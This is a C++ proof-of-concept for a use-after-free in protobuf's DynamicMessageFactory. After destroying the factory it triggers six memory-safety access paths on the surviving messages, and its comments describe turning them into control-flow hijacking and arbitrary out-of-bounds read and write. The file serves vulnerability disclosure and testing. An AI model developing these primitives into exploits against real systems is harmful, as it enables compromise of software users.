// PoC: DynamicMessageFactory use-after-free -- comprehensive severity demo.
//
// Root cause: DynamicMessage holds a raw type_info_ pointer into its owning
// DynamicMessageFactory. When the factory is destroyed, ~TypeInfo:
//   1. Deletes the Reflection object (freed heap memory)
//   2. Frees the ClassDataFull / globals block (freed heap memory)
//   3. Scribbles offsets[] with 0xCDCDCDCD (then frees)
//   4. Scribbles has_bits_indices[] with 0xCDCDCDCD (then frees)
//   5. Frees the TypeInfo struct itself
//
// Surviving DynamicMessage instances retain type_info_ -> dangling pointer.
// Every subsequent operation on these instances is a use-after-free.
//
// This PoC demonstrates 5 distinct UAF access paths, each independently
// triggering ASan. Run with --variant=N to exercise a specific path.
//
// CWE-416: Use After Free
//
// Bug locations:
//   dynamic_message.cc:455-478 -- ~TypeInfo frees Reflection, scribbles offsets
//   dynamic_message.cc:868-872 -- ~DynamicMessageFactory deletes all TypeInfo
//   dynamic_message.cc:855-857 -- GetClassData() dereferences freed type_info_
//   dynamic_message.cc:503-509 -- FieldOffset() reads freed offsets[]
//
// Impact assessment:
//   - GetReflection/GetDescriptor: reads freed ClassDataFull containing
//     function pointers (is_initialized, merge_to_from, message_creator).
//     If freed TypeInfo is reallocated with attacker data, these become
//     controlled function pointers -> arbitrary code execution.
//   - Field access (Get/Set via Reflection): reads scribbled offset 0xCDCDCDCD,
//     computes (msg_base + 0xCDCDCDCD) = ~3.4GB OOB -> arbitrary read/write
//     past message allocation. If offsets[] is reallocated with controlled data,
//     attacker chooses the target address relative to message base.
//   - New() via freed ClassData: calls message_creator function pointer
//     from freed memory -> direct control flow hijack if reclaimed.
//   - MergeFrom via freed ClassData: calls merge_to_from function pointer.
//   - Destructor: accesses freed type_info_ to get descriptor for field cleanup.
//
// Severity: HIGH (CWE-416, multiple UAF primitives, function pointer reads
//           from freed heap, OOB read/write via scribbled offsets)

#include <cstdio>
#include <cstring>
#include <string>

#include "google/protobuf/descriptor.h"
#include "google/protobuf/descriptor.pb.h"
#include "google/protobuf/dynamic_message.h"
#include "google/protobuf/message.h"

using namespace google::protobuf;

// Build a descriptor pool with a message type that has varied field types.
// This creates a non-trivial TypeInfo with multiple offsets entries.
static const Descriptor* BuildTestDescriptor(DescriptorPool* pool) {
  FileDescriptorProto file_proto;
  file_proto.set_name("test.proto");
  file_proto.set_syntax("proto3");

  DescriptorProto* msg = file_proto.add_message_type();
  msg->set_name("VictimMsg");

  auto add = [&](const char* name, int num, FieldDescriptorProto::Type t) {
    FieldDescriptorProto* f = msg->add_field();
    f->set_name(name);
    f->set_number(num);
    f->set_type(t);
    f->set_label(FieldDescriptorProto::LABEL_OPTIONAL);
  };

  // 8 fields of varied types to create interesting offset layout
  add("i32",  1, FieldDescriptorProto::TYPE_INT32);
  add("i64",  2, FieldDescriptorProto::TYPE_INT64);
  add("str",  3, FieldDescriptorProto::TYPE_STRING);
  add("dbl",  4, FieldDescriptorProto::TYPE_DOUBLE);
  add("bl",   5, FieldDescriptorProto::TYPE_BOOL);
  add("u32",  6, FieldDescriptorProto::TYPE_UINT32);
  add("byt",  7, FieldDescriptorProto::TYPE_BYTES);
  add("flt",  8, FieldDescriptorProto::TYPE_FLOAT);

  const FileDescriptor* fd = pool->BuildFile(file_proto);
  if (!fd) return nullptr;
  return fd->FindMessageTypeByName("VictimMsg");
}

// Create factory, populate a message, destroy factory, return surviving msg.
// The returned Message* holds a dangling type_info_ pointer.
static Message* CreateDanglingMessage(const Descriptor* desc,
                                       DescriptorPool* pool) {
  auto* factory = new DynamicMessageFactory(pool);
  const Message* proto = factory->GetPrototype(desc);
  Message* msg = proto->New();

  // Populate fields before factory destruction to create non-trivial state.
  const Reflection* refl = msg->GetReflection();
  refl->SetInt32(msg, desc->FindFieldByName("i32"), 0x41414141);
  refl->SetInt64(msg, desc->FindFieldByName("i64"), 0x4242424242424242LL);
  refl->SetString(msg, desc->FindFieldByName("str"), "AAAA_payload_AAAA");
  refl->SetDouble(msg, desc->FindFieldByName("dbl"), 1.337);
  refl->SetBool(msg, desc->FindFieldByName("bl"), true);
  refl->SetUInt32(msg, desc->FindFieldByName("u32"), 0x43434343);
  refl->SetString(msg, desc->FindFieldByName("byt"), "BBBB_bytes_BBBB");
  refl->SetFloat(msg, desc->FindFieldByName("flt"), 2.718f);

  fprintf(stderr, "[*] Factory at %p, TypeInfo accessed via type_info_\n",
          static_cast<void*>(factory));
  fprintf(stderr, "[*] Message at %p with 8 populated fields\n",
          static_cast<void*>(msg));

  // DESTROY FACTORY: TypeInfo freed, Reflection deleted, offsets scribbled.
  fprintf(stderr, "[!] Destroying factory -- TypeInfo freed, Reflection "
          "deleted, offsets scribbled with 0xCDCDCDCD\n");
  delete factory;

  return msg;  // dangling type_info_
}

// --------------------------------------------------------------------------
// UAF Variant 1: GetClassData / GetReflection / GetDescriptor
//
// Chain: msg->GetReflection()
//     -> msg->GetMetadata()
//     -> msg->GetClassData()                 [dynamic_message.cc:855]
//     -> type_info_->GetClassDataFull()       [DEREF FREED TypeInfo]
//     -> ClassDataFull.base()                 [READS FREED ClassDataFull]
//     -> ClassData.full()                     [READS FREED ClassDataFull]
//     -> ClassDataFull.reflection()           [RETURNS FREED Reflection*]
//
// ASan report: heap-use-after-free READ on the freed TypeInfo/ClassDataFull.
// Without ASan: returns a pointer into freed heap. If that memory is
// reallocated and attacker-controlled, the returned "Reflection*" points
// to attacker data. Subsequent use of that Reflection dispatches through
// its vtable or schema_, which are attacker-controlled.
// --------------------------------------------------------------------------
static void variant_1_get_reflection(Message* msg) {
  fprintf(stderr, "\n=== VARIANT 1: GetReflection() via freed ClassDataFull ===\n");
  fprintf(stderr, "[*] Calling msg->GetReflection()...\n");
  const Reflection* r = msg->GetReflection();
  fprintf(stderr, "[!] Got Reflection* = %p (FREED MEMORY)\n",
          static_cast<const void*>(r));
}

// --------------------------------------------------------------------------
// UAF Variant 2: Field access via freed Reflection + scribbled offsets
//
// After factory destruction:
//   - Reflection object is deleted (heap-freed)
//   - offsets[] array is scribbled with 0xCDCDCDCD, then freed
//
// If offsets[] memory hasn't been reclaimed yet:
//   Reflection::GetRaw<int32_t>(msg, field)
//     -> schema_.GetFieldOffset<int32_t>(field)
//     -> offsets_[field->index()]              [READS FREED/SCRIBBLED MEMORY]
//     -> returns 0xCDCDCDCC (masked for alignment)
//     -> GetConstRefAtOffset<int32_t>(msg, 0xCDCDCDCC)
//     -> *(int32_t*)((char*)msg + 0xCDCDCDCC)  [OOB READ ~3.4GB past msg]
//
// This is an arbitrary OOB read. For SetField, it's an arbitrary OOB write.
// If offsets[] IS reclaimed with attacker data, the offset value is controlled
// -> read/write at arbitrary offset from message base.
// --------------------------------------------------------------------------
static void variant_2_field_access(Message* msg, const Descriptor* desc) {
  fprintf(stderr, "\n=== VARIANT 2: Field access via scribbled offsets ===\n");

  // First get the freed Reflection (itself a UAF, needed to reach variant 2)
  const Reflection* freed_refl = msg->GetReflection();
  fprintf(stderr, "[*] Got freed Reflection at %p\n",
          static_cast<const void*>(freed_refl));

  // Attempt to read field "i32" -- this will read scribbled offset 0xCDCDCDCD,
  // mask it for int32 alignment -> 0xCDCDCDCC, and try to read from
  // (msg + 0xCDCDCDCC), which is ~3.4GB past the message allocation.
  const FieldDescriptor* f = desc->FindFieldByName("i32");
  fprintf(stderr, "[*] Reading field '%.*s' (index=%d) via freed Reflection...\n",
          static_cast<int>(f->name().size()), f->name().data(), f->index());
  fprintf(stderr, "[!] offset = offsets_[%d] = 0xCDCDCDCD (scribbled)\n",
          f->index());
  fprintf(stderr, "[!] target = (char*)msg + 0xCDCDCDCC = %p + 0xCDCDCDCC\n",
          static_cast<void*>(msg));
  fprintf(stderr, "[!] Reading int32 at ~3.4GB OOB...\n");

  int32_t val = freed_refl->GetInt32(*msg, f);
  fprintf(stderr, "[!] Read value: 0x%08x (SHOULD NOT REACH HERE)\n", val);
}

// --------------------------------------------------------------------------
// UAF Variant 3: MergeFrom via freed merge_to_from function pointer
//
// ClassData contains: void (*merge_to_from)(MessageLite&, const MessageLite&)
// After factory destruction, ClassData is freed. MergeFrom reads this
// function pointer from freed memory and calls it.
//
// Chain: msg2->MergeFrom(*msg1)
//     -> msg2->GetClassData()                 [DEREF FREED type_info_]
//     -> class_data->merge_to_from(...)       [CALL FREED FUNCTION POINTER]
//
// If the freed ClassData is reclaimed with attacker data, merge_to_from
// is a fully controlled function pointer call.
// --------------------------------------------------------------------------
static void variant_3_merge_from(Message* msg, const Descriptor* desc,
                                  DescriptorPool* pool) {
  fprintf(stderr, "\n=== VARIANT 3: MergeFrom via freed function pointer ===\n");

  // Create a second dangling message from a separate factory
  auto* factory2 = new DynamicMessageFactory(pool);
  const Message* proto2 = factory2->GetPrototype(desc);
  Message* msg2 = proto2->New();
  delete factory2;

  fprintf(stderr, "[*] Two dangling messages: msg=%p, msg2=%p\n",
          static_cast<void*>(msg), static_cast<void*>(msg2));
  fprintf(stderr, "[!] Calling msg2->MergeFrom(*msg) -- reads freed "
          "merge_to_from function pointer...\n");

  msg2->MergeFrom(*msg);
  fprintf(stderr, "[!] MergeFrom returned (SHOULD NOT REACH HERE)\n");
  delete msg2;
}

// --------------------------------------------------------------------------
// UAF Variant 4: New() via freed message_creator
//
// ClassData contains: MessageCreator message_creator
// MessageCreator stores a function pointer for constructing new instances.
// After factory destruction, New() reads this from freed ClassData.
//
// Chain: msg->New()
//     -> msg->GetClassData()                  [DEREF FREED type_info_]
//     -> class_data->New(arena)               [in message_lite.h:439]
//     -> message_creator.AllocateMessage()     [READS FREED MessageCreator]
//     -> message_creator.PlacementNew(...)     [CALLS FREED FUNCTION PTR]
//
// The PlacementNew function pointer in MessageCreator is read from freed
// memory. With heap reclamation, this is a controlled call target.
// --------------------------------------------------------------------------
static void variant_4_new(Message* msg) {
  fprintf(stderr, "\n=== VARIANT 4: New() via freed message_creator ===\n");
  fprintf(stderr, "[!] Calling msg->New() -- reads freed message_creator "
          "function pointer...\n");

  Message* new_msg = msg->New();
  fprintf(stderr, "[!] New() returned %p (SHOULD NOT REACH HERE)\n",
          static_cast<void*>(new_msg));
  delete new_msg;
}

// --------------------------------------------------------------------------
// UAF Variant 5: SerializeToString via freed Reflection + scribbled offsets
//
// Serialization iterates all fields via Reflection. For each field:
//   1. Reads has_bits via freed has_bits_indices[] (scribbled to 0xCDCDCDCD)
//   2. Reads field offset via freed offsets[] (scribbled to 0xCDCDCDCD)
//   3. Accesses field data at (msg + 0xCDCDCDCC) -> OOB read
//   4. Writes serialized data (OOB-read data leaks into output)
//
// This is an information disclosure primitive: data at ~3.4GB offset from
// the message base is serialized and returned to the caller.
// --------------------------------------------------------------------------
static void variant_5_serialize(Message* msg) {
  fprintf(stderr, "\n=== VARIANT 5: SerializeToString via scribbled offsets ===\n");
  fprintf(stderr, "[!] Calling msg->SerializeToString() -- will read "
          "field data at scribbled offsets (OOB)...\n");

  std::string out;
  (void)msg->SerializeToString(&out);
  fprintf(stderr, "[!] Serialized %zu bytes (SHOULD NOT REACH HERE)\n",
          out.size());
}

// --------------------------------------------------------------------------
// UAF Variant 6: Destructor via freed type_info_
//
// ~DynamicMessage accesses type_info_ to get allocation_size for sized delete:
//   dynamic_message.cc:689:
//     const size_t size = msg->type_info_->GetClassDataFull().allocation_size();
//
// Also iterates descriptor fields to clean up string/message fields.
// All through freed type_info_.
// --------------------------------------------------------------------------
static void variant_6_destructor(Message* msg) {
  fprintf(stderr, "\n=== VARIANT 6: Destructor via freed type_info_ ===\n");
  fprintf(stderr, "[!] Calling delete msg -- destructor accesses freed "
          "type_info_ for allocation_size and field cleanup...\n");

  delete msg;
  fprintf(stderr, "[!] Destructor completed (SHOULD NOT REACH HERE "
          "without ASan report)\n");
}

static void usage(const char* prog) {
  fprintf(stderr, "Usage: %s [--variant=N]\n", prog);
  fprintf(stderr, "  N=1: GetReflection() via freed ClassDataFull\n");
  fprintf(stderr, "  N=2: Field access via scribbled offsets (OOB read)\n");
  fprintf(stderr, "  N=3: MergeFrom via freed function pointer\n");
  fprintf(stderr, "  N=4: New() via freed message_creator\n");
  fprintf(stderr, "  N=5: SerializeToString via scribbled offsets\n");
  fprintf(stderr, "  N=6: Destructor via freed type_info_\n");
  fprintf(stderr, "  N=0: Run all variants sequentially (default)\n");
}

int main(int argc, char** argv) {
  int variant = 0;  // default: run all

  for (int i = 1; i < argc; i++) {
    if (strncmp(argv[i], "--variant=", 10) == 0) {
      variant = atoi(argv[i] + 10);
    } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
      usage(argv[0]);
      return 0;
    }
  }

  DescriptorPool pool;
  const Descriptor* desc = BuildTestDescriptor(&pool);
  if (!desc) {
    fprintf(stderr, "FAIL: BuildTestDescriptor failed\n");
    return 1;
  }

  fprintf(stderr, "Descriptor: %.*s (%d fields)\n",
          static_cast<int>(desc->full_name().size()),
          desc->full_name().data(), desc->field_count());

  if (variant == 0 || variant == 1) {
    Message* msg = CreateDanglingMessage(desc, &pool);
    variant_1_get_reflection(msg);
    delete msg;  // also UAF but needed for cleanup if ASan doesn't abort
  }

  if (variant == 0 || variant == 2) {
    Message* msg = CreateDanglingMessage(desc, &pool);
    variant_2_field_access(msg, desc);
    delete msg;
  }

  if (variant == 0 || variant == 3) {
    Message* msg = CreateDanglingMessage(desc, &pool);
    variant_3_merge_from(msg, desc, &pool);
    delete msg;
  }

  if (variant == 0 || variant == 4) {
    Message* msg = CreateDanglingMessage(desc, &pool);
    variant_4_new(msg);
    delete msg;
  }

  if (variant == 0 || variant == 5) {
    Message* msg = CreateDanglingMessage(desc, &pool);
    variant_5_serialize(msg);
    delete msg;
  }

  if (variant == 0 || variant == 6) {
    Message* msg = CreateDanglingMessage(desc, &pool);
    variant_6_destructor(msg);
    // msg already deleted in variant_6
  }

  fprintf(stderr, "\nDONE (no crash -- unexpected without ASan)\n");
  return 0;
}
